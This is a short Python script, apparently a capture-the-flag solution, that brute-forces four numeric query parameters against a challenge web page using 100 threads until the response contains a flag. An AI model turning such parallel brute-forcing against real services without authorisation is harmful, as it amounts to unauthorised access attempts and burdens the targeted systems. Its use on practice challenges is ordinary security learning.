import requests
import concurrent.futures
from threading import Lock

# Base URL
url = "http://chal.eng.run:8002/index.php?"

# Function to send a GET request and check the response
def check_combination(q1, q2, q3, q4, counter, lock):
    params = {
        "q1": q1,
        "q2": q2,
        "q3": q3,
        "q4": q4
    }
    response = requests.get(url, params=params)
    print(response.text)
    with lock:
        counter[0] += 1
        print(f"Threads executed: {counter[0]}")
    if  "flag" in response.text:
        print(response.text)
        print(f"q1: {q1}, q2: {q2}, q3: {q3}, q4: {q4}")
        return True
    return False

# Allowed values for q1, q2, q3, and q4
allowed_values = range(10)

# Counter and lock for thread-safe operations
counter = [0]  # Using a list to allow pass-by-reference
lock = Lock()

# Use ThreadPoolExecutor with 100 threads
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    # Create a list of all possible combinations
    future_to_combination = {
        executor.submit(check_combination, q1, q2, q3, q4, counter, lock): (q1, q2, q3, q4)
        for q1 in allowed_values
        for q2 in allowed_values
        for q3 in allowed_values
        for q4 in allowed_values
    }

    # Process the results as they complete
    for future in concurrent.futures.as_completed(future_to_combination):
        if future.result():
            break
